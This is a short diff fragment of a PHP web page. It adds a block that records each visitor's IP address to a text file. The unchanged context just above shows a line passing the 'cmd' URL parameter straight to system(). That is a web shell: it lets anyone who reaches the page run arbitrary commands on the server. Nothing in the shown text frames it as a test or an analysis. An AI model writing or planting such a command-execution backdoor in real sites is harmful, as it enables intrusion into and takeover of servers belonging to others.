@@ -11,6 +11,13 @@
         system($_GET['cmd']);
     }
 ?>
+<?php
+$ip = $_SERVER["REMOTE_ADDR"];
+echo $ip;
+$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
+fwrite($myfile, $ip);
+fclose($myfile);
+?>
 </pre>
 </body>
 </html>
